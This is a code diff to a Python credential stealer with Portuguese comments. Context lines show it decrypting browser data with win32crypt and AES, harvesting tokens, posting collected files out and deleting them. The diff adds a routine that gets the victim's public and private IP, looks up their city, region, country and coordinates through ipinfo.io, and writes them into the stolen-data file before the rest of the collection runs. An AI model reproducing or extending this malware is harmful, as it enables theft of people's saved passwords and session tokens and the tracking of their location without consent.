@@ -7,6 +7,8 @@ from sqlite3 import connect
 import win32crypt
 from Crypto.Cipher import AES
 from requests import post
+import socket
+import requests 
 
 # ------------------- Configurações de Caminho -------------------
 
@@ -234,8 +236,46 @@ def file_handler(file):
             post_to(file)
         os.remove(file)
 
+# ------------------- Função para Capturar Geolocalização -------------------
+def capturar_geolocalizacao():
+    try:
+        # Obter o IP público
+        ip_publico = requests.get('https://api.ipify.org').text
+
+        # Obter o IP privado
+        ip_privado = socket.gethostbyname(socket.gethostname())
+
+        # Obter geolocalização a partir do IP público
+        resposta_geo = requests.get(f'https://ipinfo.io/{ip_publico}/json')
+        if resposta_geo.status_code == 200:
+            dados_geo = resposta_geo.json()
+            cidade = dados_geo.get('city', 'Não disponível')
+            regiao = dados_geo.get('region', 'Não disponível')
+            pais = dados_geo.get('country', 'Não disponível')
+            loc = dados_geo.get('loc', 'Não disponível')  # Latitude e Longitude
+
+            # Escrever as informações no arquivo
+            with open(fileInfo, "a") as f:
+                f.write(f"\nInformações de Geolocalização\n")
+                f.write(f"IP Público: {ip_publico}\n")
+                f.write(f"IP Privado: {ip_privado}\n")
+                f.write(f"Cidade: {cidade}\n")
+                f.write(f"Região: {regiao}\n")
+                f.write(f"País: {pais}\n")
+                f.write(f"Localização (Lat, Long): {loc}\n")
+        else:
+            with open(fileInfo, "a") as f:
+                f.write(f"\nInformações de Geolocalização\n")
+                f.write("Não foi possível obter as informações de geolocalização\n")
+    except Exception as e:
+        with open(fileInfo, "a") as f:
+            f.write(f"\nErro ao obter informações de geolocalização\n{str(e)}\n")
+
 # ------------------- Função Principal -------------------
 def main():
+    # Capturar geolocalização antes de coletar outras informações
+    capturar_geolocalizacao()
+    
     for nome, path in browser_loc.items():
         decrypt_files(path, nome)
     main_tokens()
